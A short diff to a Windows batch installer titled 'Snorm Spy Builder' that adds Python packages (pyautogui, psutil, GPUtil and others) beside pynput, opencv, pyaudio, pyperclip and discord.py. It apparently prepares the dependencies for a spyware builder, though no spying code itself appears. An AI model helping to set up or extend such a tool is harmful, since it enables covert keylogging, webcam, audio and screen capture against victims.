@@ -14,7 +14,7 @@ if %errorlevel% neq 0 (
 title Installing required libraries...
 
 python -m pip install --upgrade pip --quiet
-python -m pip install requests pycryptodome discord.py opencv-python pyperclip pillow uuid imageio pywin32 pynput pyaudio wave --quiet
+python -m pip install requests pycryptodome discord.py opencv-python pyperclip pillow uuid imageio pywin32 pynput pyaudio wave aiohttp numpy pyautogui screeninfo GPUtil psutil --quiet
 
 cls
 title Snorm Spy Builder
